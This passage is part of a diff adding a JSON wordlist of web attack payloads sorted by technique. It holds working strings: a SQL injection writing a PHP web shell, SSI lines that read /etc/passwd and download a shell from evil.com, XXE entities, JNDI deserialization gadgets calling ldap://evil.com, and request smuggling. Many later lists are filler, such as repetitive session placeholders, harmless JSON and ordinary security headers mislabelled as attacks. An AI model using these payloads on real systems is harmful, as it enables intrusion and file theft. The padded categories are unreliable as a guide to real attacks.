+    "' AND (SELECT '<?php system($_GET[\"cmd\"]); ?>') INTO DUMPFILE '/var/www/html/backdoor.php'--"
+  ],
+  
+  "xpath_injection": [
+    "' or '1'='1",
+    "' or ''='",
+    "' or 1=1",
+    "' or position()=last()",
+    "' or count(*)=count(*)",
+    "' or string-length(name)=5",
+    "' or substring(name,1,1)='a'",
+    "' or contains(name,'admin')",
+    "' or starts-with(name,'admin')",
+    "' or name='admin' or '1'='1"
+  ],
+  
+  "ldap_injection": [
+    "*)(uid=*))(|(uid=*",
+    "*)(&",
+    "*)(|(&",
+    "*))%00",
+    "admin)(&)",
+    "admin*)((|userPassword=*)",
+    "admin*)((|objectClass=*)",
+    "*)(objectClass=*))(&objectClass=void",
+    "*)(|(objectClass=*",
+    "*)(|(objectclass=*"
+  ],
+  
+  "html_injection": [
+    "<h1>Hacked</h1>",
+    "<marquee>Hacked</marquee>",
+    "<blink>Hacked</blink>",
+    "<script>alert('Hacked')</script>",
+    "<img src=x onerror=alert('Hacked')>",
+    "<iframe src=\"javascript:alert('Hacked')\">",
+    "<body onload=alert('Hacked')>",
+    "<svg onload=alert('Hacked')>",
+    "<video><source onerror=\"alert('Hacked')\">",
+    "<audio src=x onerror=alert('Hacked')>"
+  ],
+  
+  "css_injection": [
+    "expression(alert('XSS'))",
+    "-moz-binding:url('http://evil.com/xss.xml#xss')",
+    "background-image: url('javascript:alert(\"XSS\")')",
+    "background: url('javascript:alert(\"XSS\")')",
+    "list-style-image: url('javascript:alert(\"XSS\")')",
+    "behavior: url('http://evil.com/xss.htc')",
+    "@import 'javascript:alert(\"XSS\")'",
+    "@import url('javascript:alert(\"XSS\")')",
+    "xss:expression(alert('XSS'))",
+    "color: expression(alert('XSS'))"
+  ],
+  
+  "email_injection": [
+    "user@example.com\nBcc: victim@target.com",
+    "user@example.com%0ABcc: victim@target.com",
+    "user@example.com%0D%0ABcc: victim@target.com",
+    "user@example.com%0ABcc: victim1@target.com,victim2@target.com",
+    "user@example.com%0ATo: victim@target.com",
+    "user@example.com%0ASubject: Hacked",
+    "user@example.com%0AMessage-ID: <hacked@evil.com>",
+    "user@example.com%0AFrom: attacker@evil.com",
+    "user@example.com%0AReply-To: attacker@evil.com",
+    "user@example.com%0AX-Header: Hacked"
+  ],
+  
+  "http_request_smuggling": [
+    "GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+    "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+    "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+    "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
+    "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
+    "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
+  ],
+  
+  "cache_poisoning": [
+    "GET / HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-Host: evil.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nX-Host: evil.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-Server: evil.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nX-HTTP-Host-Override: evil.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nX-Original-URL: evil.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nX-Rewrite-URL: evil.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nX-Original-Host: evil.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-For: evil.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nX-Real-IP: evil.com\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: target.com\r\nTrue-Client-IP: evil.com\r\n\r\n"
+  ],
+  
+  "host_header_injection": [
+    "Host: evil.com",
+    "Host: target.com.evil.com",
+    "Host: target.com\r\nX-Forwarded-Host: evil.com",
+    "Host: target.com\r\nX-Host: evil.com",
+    "Host: target.com\r\nX-Forwarded-Server: evil.com",
+    "Host: target.com\r\nX-HTTP-Host-Override: evil.com",
+    "Host: target.com\r\nX-Original-URL: evil.com",
+    "Host: target.com\r\nX-Rewrite-URL: evil.com",
+    "Host: target.com\r\nX-Original-Host: evil.com",
+    "Host: target.com\r\nX-Forwarded-For: evil.com"
+  ],
+  
+  "http_response_splitting": [
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\n\r\n<script>alert('XSS')</script>",
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\nLocation: javascript:alert('XSS')\r\n\r\n",
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\nSet-Cookie: sessionid=1234; domain=evil.com\r\n\r\n",
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\nRefresh: 0; url=javascript:alert('XSS')\r\n\r\n",
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\nX-XSS-Protection: 0\r\n\r\n",
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\nX-Content-Type-Options: nosniff\r\n\r\n",
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\nX-Frame-Options: DENY\r\n\r\n",
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\nContent-Security-Policy: default-src 'self'\r\n\r\n",
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\nStrict-Transport-Security: max-age=31536000\r\n\r\n",
+    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 100\r\nAccess-Control-Allow-Origin: *\r\n\r\n"
+  ],
+  
+  "insecure_deserialization": [
+    "O:8:\"stdClass\":1:{s:5:\"hello\";s:5:\"world\";}",
+    "a:1:{s:5:\"hello\";s:5:\"world\";}",
+    "{\"hello\":\"world\"}",
+    "{\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.ProcessBuilder\",\"command\":[\"calc.exe\"]}",
+    "{\"@type\":\"org.apache.commons.collections.functors.InvokerTransformer\",\"iMethodName\":\"exec\",\"iArgs\":[\"calc.exe\"]}",
+    "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.com/Exploit\",\"autoCommit\":true}",
+    "{\"@type\":\"org.springframework.context.support.FileSystemXmlApplicationContext\",\"configLocation\":\"http://evil.com/spel.xml\"}",
+    "{\"@type\":\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\"targetBeanName\":\"ldap://evil.com/Exploit\",\"propertyPath\":\"foo\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"ldap://evil.com/Exploit\"]}}",
+    "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\"jndiName\":\"ldap://evil.com/Exploit\",\"loginTimeout\":0}",
+    "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://evil.com/Exploit\"}"
+  ],
+  
+  "server_side_includes": [
+    "<!--#exec cmd=\"id\" -->",
+    "<!--#include file=\"/etc/passwd\" -->",
+    "<!--#include virtual=\"/etc/passwd\" -->",
+    "<!--#echo var=\"DOCUMENT_ROOT\" -->",
+    "<!--#config errmsg=\"Hacked\" -->",
+    "<!--#printenv -->",
+    "<!--#flastmod file=\"index.html\" -->",
+    "<!--#fsize file=\"index.html\" -->",
+    "<!--#include file=\"http://evil.com/shell.txt\" -->",
+    "<!--#exec cmd=\"wget http://evil.com/shell.txt -O /tmp/shell.php\" -->"
+  ],
+  
+  "log_injection": [
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] LOGIN SUCCESSFUL\n",
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] PASSWORD CHANGED\n",
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] PERMISSIONS CHANGED\n",
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] ACCOUNT DELETED\n",
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] PAYMENT PROCESSED\n",
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] ORDER PLACED\n",
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] TRANSFER COMPLETED\n",
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] WITHDRAWAL COMPLETED\n",
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] DEPOSIT COMPLETED\n",
+    "\n\nadmin [Tue Jan 01 00:00:00 2020] BALANCE UPDATED\n"
+  ],
+  
+  "regex_injection": [
+    "(a+)+",
+    "([a-zA-Z]+)*",
+    "(a|aa)+",
+    "(a|a?)+",
+    "(.*a){x} for x > 10",
+    "^(a+)+$",
+    "^(a|a?)+$",
+    "^(([a-z])+.)+[A-Z]([a-z])+$",
+    "^(([a-z])+.)+[A-Z]([a-z])+$",
+    "^(([a-z])+.)+[A-Z]([a-z])+$"
+  ],
+  
+  "xml_injection": [
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe\"> %xxe;]>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> <!ENTITY xxe2 \"%xxe;\">]>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe\"> <!ENTITY xxe2 \"%xxe;\">]>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> <!ENTITY xxe2 \"%xxe;\"> <!ENTITY xxe3 \"&xxe2;\">]>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe\"> <!ENTITY xxe2 \"%xxe;\"> <!ENTITY xxe3 \"&xxe2;\">]>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> <!ENTITY xxe2 \"%xxe;\"> <!ENTITY xxe3 \"&xxe2;\"> <!ENTITY xxe4 \"&xxe3;\">]>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe\"> <!ENTITY xxe2 \"%xxe;\"> <!ENTITY xxe3 \"&xxe2;\"> <!ENTITY xxe4 \"&xxe3;\">]>"
+  ],
+  
+  "json_injection": [
+    "{\"hello\":\"world\"}",
+    "{\"hello\":\"world\",\"foo\":\"bar\"}",
+    "{\"hello\":\"world\",\"foo\":\"bar\",\"baz\":\"qux\"}",
+    "{\"hello\":\"world\",\"foo\":\"bar\",\"baz\":\"qux\",\"quux\":\"corge\"}",
+    "{\"hello\":\"world\",\"foo\":\"bar\",\"baz\":\"qux\",\"quux\":\"corge\",\"grault\":\"garply\"}",
+    "{\"hello\":\"world\",\"foo\":\"bar\",\"baz\":\"qux\",\"quux\":\"corge\",\"grault\":\"garply\",\"waldo\":\"fred\"}",
+    "{\"hello\":\"world\",\"foo\":\"bar\",\"baz\":\"qux\",\"quux\":\"corge\",\"grault\":\"garply\",\"waldo\":\"fred\",\"plugh\":\"xyzzy\"}",
+    "{\"hello\":\"world\",\"foo\":\"bar\",\"baz\":\"qux\",\"quux\":\"corge\",\"grault\":\"garply\",\"waldo\":\"fred\",\"plugh\":\"xyzzy\",\"thud\":\"thud\"}",
+    "{\"hello\":\"world\",\"foo\":\"bar\",\"baz\":\"qux\",\"quux\":\"corge\",\"grault\":\"garply\",\"waldo\":\"fred\",\"plugh\":\"xyzzy\",\"thud\":\"thud\",\"foo2\":\"bar2\"}",
+    "{\"hello\":\"world\",\"foo\":\"bar\",\"baz\":\"qux\",\"quux\":\"corge\",\"grault\":\"garply\",\"waldo\":\"fred\",\"plugh\":\"xyzzy\",\"thud\":\"thud\",\"foo2\":\"bar2\",\"baz2\":\"qux2\"}"
+  ],
+  
+  "javascript_injection": [
+    "alert('XSS')",
+    "document.cookie",
+    "document.location='http://evil.com'",
+    "document.write('<script src=\"http://evil.com/xss.js\"></script>')",
+    "eval('alert(\"XSS\")')",
+    "setTimeout('alert(\"XSS\")',0)",
+    "setInterval('alert(\"XSS\")',0)",
+    "Function('alert(\"XSS\")')()",
+    "new Function('alert(\"XSS\")')()",
+    "[].constructor.constructor('alert(\"XSS\")')()"
+  ],
+  
+  "dom_based_xss": [
+    "document.location.hash",
+    "document.location.search",
+    "document.referrer",
+    "document.URL",
+    "document.documentURI",
+    "document.baseURI",
+    "document.cookie",
+    "document.title",
+    "document.body.innerHTML",
+    "document.write"
+  ],
+  
+  "url_redirection": [
+    "http://evil.com",
+    "https://evil.com",
+    "//evil.com",
+    "\\\\evil.com",
+    "javascript:alert('XSS')",
+    "data:text/html,<script>alert('XSS')</script>",
+    "vbscript:alert('XSS')",
+    "about:blank",
+    "file:///etc/passwd",
+    "ftp://evil.com"
+  ],
+  
+  "open_redirect_basic": [
+    "http://target.com/redirect?url=http://evil.com",
+    "http://target.com/redirect?url=//evil.com",
+    "http://target.com/redirect?url=\\evil.com",
+    "http://target.com/redirect?url=javascript:alert('XSS')",
+    "http://target.com/redirect?url=data:text/html,<script>alert('XSS')</script>",
+    "http://target.com/redirect?url=vbscript:alert('XSS')",
+    "http://target.com/redirect?url=about:blank",
+    "http://target.com/redirect?url=file:///etc/passwd",
+    "http://target.com/redirect?url=ftp://evil.com",
+    "http://target.com/redirect?url=//evil.com@target.com"
+  ],
+  
+  "open_redirect_advanced": [
+    "http://target.com/redirect?url=http://evil.com\\target.com",
+    "http://target.com/redirect?url=http://evil.com/target.com",
+    "http://target.com/redirect?url=http://evil.com?target.com",
+    "http://target.com/redirect?url=http://evil.com#target.com",
+    "http://target.com/redirect?url=http://evil.com:target.com",
+    "http://target.com/redirect?url=http://evil.com:80@target.com",
+    "http://target.com/redirect?url=http://evil.com:80\\target.com",
+    "http://target.com/redirect?url=http://evil.com:80/target.com",
+    "http://target.com/redirect?url=http://evil.com:80?target.com",
+    "http://target.com/redirect?url=http://evil.com:80#target.com"
+  ],
+  
+  "csrf_token_bypass": [
+    "csrf_token=bypass",
+    "csrf_token=disabled",
+    "csrf_token=off",
+    "csrf_token=false",
+    "csrf_token=0",
+    "csrf_token=null",
+    "csrf_token=undefined",
+    "csrf_token=1",
+    "csrf_token=true",
+    "csrf_token=on",
+    "csrf_token=1234",
+    "csrf_token=0000",
+    "csrf_token=1111",
+    "csrf_token=aaaa",
+    "csrf_token=admin",
+    "csrf_token=password",
+    "csrf_token=test",
+    "csrf_token=123456",
+    "csrf_token=654321",
+    "csrf_token=123456789"
+  ],
+  
+  "session_fixation": [
+    "sessionid=1234",
+    "PHPSESSID=1234",
+    "JSESSIONID=1234",
+    "ASP.NET_SessionId=1234",
+    "session_id=1234",
+    "session=1234",
+    "sid=1234",
+    "token=1234",
+    "auth=1234",
+    "auth_token=1234"
+  ],
+  
+  "session_timeout": [
+    "session_timeout=0",
+    "session_timeout=999999999",
+    "session_timeout=2147483647",
+    "session_timeout=-1",
+    "session_timeout=null",
+    "session_timeout=undefined",
+    "session_timeout=false",
+    "session_timeout=true",
+    "session_timeout=bypass",
+    "session_timeout=disabled"
+  ],
+  
+  "session_hijacking": [
+    "sessionid=admin",
+    "PHPSESSID=admin",
+    "JSESSIONID=admin",
+    "ASP.NET_SessionId=admin",
+    "session_id=admin",
+    "session=admin",
+    "sid=admin",
+    "token=admin",
+    "auth=admin",
+    "auth_token=admin"
+  ],
+  
+  "session_invalidation": [
+    "sessionid=invalid",
+    "PHPSESSID=invalid",
+    "JSESSIONID=invalid",
+    "ASP.NET_SessionId=invalid",
+    "session_id=invalid",
+    "session=invalid",
+    "sid=invalid",
+    "token=invalid",
+    "auth=invalid",
+    "auth_token=invalid"
+  ],
+  
+  "session_regeneration": [
+    "sessionid=regenerated",
+    "PHPSESSID=regenerated",
+    "JSESSIONID=regenerated",
+    "ASP.NET_SessionId=regenerated",
+    "session_id=regenerated",
+    "session=regenerated",
+    "sid=regenerated",
+    "token=regenerated",
+    "auth=regenerated",
+    "auth_token=regenerated"
+  ],
+  
+  "session_expiration": [
+    "sessionid=expired",
+    "PHPSESSID=expired",
+    "JSESSIONID=expired",
+    "ASP.NET_SessionId=expired",
+    "session_id=expired",
+    "session=expired",
+    "sid=expired",
+    "token=expired",
+    "auth=expired",
+    "auth_token=expired"
+  ],
+  
+  "session_replay": [
+    "sessionid=replayed",
+    "PHPSESSID=replayed",
+    "JSESSIONID=replayed",
+    "ASP.NET_SessionId=replayed",
+    "session_id=replayed",
+    "session=replayed",
+    "sid=replayed",
+    "token=replayed",
+    "auth=replayed",
+    "auth_token=replayed"
+  ],
+  
+  "session_sidejacking": [
+    "sessionid=sidejacked",
+    "PHPSESSID=sidejacked",
+    "JSESSIONID=sidejacked",
+    "ASP.NET_SessionId=sidejacked",
+    "session_id=sidejacked",
+    "session=sidejacked",
+    "sid=sidejacked",
+    "token=sidejacked",
+    "auth=sidejacked",
+    "auth_token=sidejacked"
+  ],
+  
+  "session_riding": [
+    "sessionid=ridden",
+    "PHPSESSID=ridden",
+    "JSESSIONID=ridden",
+    "ASP.NET_SessionId=ridden",
+    "session_id=ridden",
+    "session=ridden",
+    "sid=ridden",
+    "token=ridden",
+    "auth=ridden",
+    "auth_token=ridden"
+  ],
+  
+  "session_fixation_advanced": [
+    "sessionid=fixed",
+    "PHPSESSID=fixed",
+    "JSESSIONID=fixed",
+    "ASP.NET_SessionId=fixed",
+    "session_id=fixed",
+    "session=fixed",
+    "sid=fixed",
+    "token=fixed",
+    "auth=fixed",
+    "auth_token=fixed"
+  ],
+  
+  "session_prediction": [
+    "sessionid=predicted",
+    "PHPSESSID=predicted",
+    "JSESSIONID=predicted",
+    "ASP.NET_SessionId=predicted",
+    "session_id=predicted",
+    "session=predicted",
+    "sid=predicted",
+    "token=predicted",
+    "auth=predicted",
+    "auth_token=predicted"
+  ],
+  
+  "session_poisoning": [
+    "sessionid=poisoned",
+    "PHPSESSID=poisoned",
+    "JSESSIONID=poisoned",
+    "ASP.NET_SessionId=poisoned",
+    "session_id=poisoned",
+    "session=poisoned",
+    "sid=poisoned",
+    "token=poisoned",
+    "auth=poisoned",
+    "auth_token=poisoned"
+  ],
+  
+  "session_injection": [
+    "sessionid=injected",
+    "PHPSESSID=injected",
+    "JSESSIONID=injected",
+    "ASP.NET_SessionId=injected",
+    "session_id=injected",
+    "session=injected",
+    "sid=injected",
+    "token=injected",
+    "auth=injected",
+    "auth_token=injected"
+  ],
+  
+  "session_manipulation": [
+    "sessionid=manipulated",
+    "PHPSESSID=manipulated",
+    "JSESSIONID=manipulated",
+    "ASP.NET_SessionId=manipulated",
+    "session_id=manipulated",
+    "session=manipulated",
+    "sid=manipulated",
+    "token=manipulated",
+    "auth=manipulated",
+    "auth_token=manipulated"
+  ],
+  
+  "session_forgery": [
+    "sessionid=forged",
+    "PHPSESSID=forged",
+    "JSESSIONID=forged",
+    "ASP.NET_SessionId=forged",
+    "session_id=forged",
+    "session=forged",
+    "sid=forged",
+    "token=forged",
+    "auth=forged",
+    "auth_token=forged"
+  ],
+  
+  "session_spoofing": [
+    "sessionid=spoofed",
+    "PHPSESSID=spoofed",
+    "JSESSIONID=spoofed",
+    "ASP.NET_SessionId=spoofed",
+    "session_id=spoofed",
+    "session=spoofed",
+    "sid=spoofed",
+    "token=spoofed",
+    "auth=spoofed",
+    "auth_token=spoofed"
+  ],
+  
+  "session_reuse": [
+    "sessionid=reused",
+    "PHPSESSID=reused",
+    "JSESSIONID=reused",
+    "ASP.NET_SessionId=reused",
+    "session_id=reused",
+    "session=reused",
+    "sid=reused",
+    "token=reused",
+    "auth=reused",
+    "auth_token=reused"
+  ],
+  
+  "session_stealing": [
+    "sessionid=stolen",
+    "PHPSESSID=stolen",
+    "JSESSIONID=stolen",
+    "ASP.NET_SessionId=stolen",
+    "session_id=stolen",
+    "session=stolen",
+    "sid=stolen",
+    "token=stolen",
+    "auth=stolen",
+    "auth_token=stolen"
+  ],
+  
+  "session_tampering": [
+    "sessionid=tampered",
+    "PHPSESSID=tampered",
+    "JSESSIONID=tampered",
+    "ASP.NET_SessionId=tampered",
+    "session_id=tampered",
+    "session=tampered",
+    "sid=tampered",
+    "token=tampered",
+    "auth=tampered",
+    "auth_token=tampered"
+  ]
+}
